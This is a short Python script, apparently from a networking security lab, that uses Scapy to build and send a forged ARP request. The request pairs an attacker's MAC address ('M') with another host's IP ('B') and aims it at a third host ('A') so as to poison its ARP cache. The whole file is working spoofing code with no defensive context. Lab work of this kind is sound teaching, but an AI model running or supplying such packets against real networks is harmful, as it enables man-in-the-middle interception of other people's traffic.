#!/usr/bin/env python3
from scapy.all import *

E = Ether()
A = ARP()

A.op = 1	# 1 for ARP request; 2 for ARP reply
A.hwsrc = '02:42:0a:09:00:69'	# source MAC	M's MAC
A.psrc = '10.9.0.6'		# source IP	B's IP
A.pdst = '10.9.0.5'		# destination IP	A's IP

pkt = E/A
sendp(pkt)
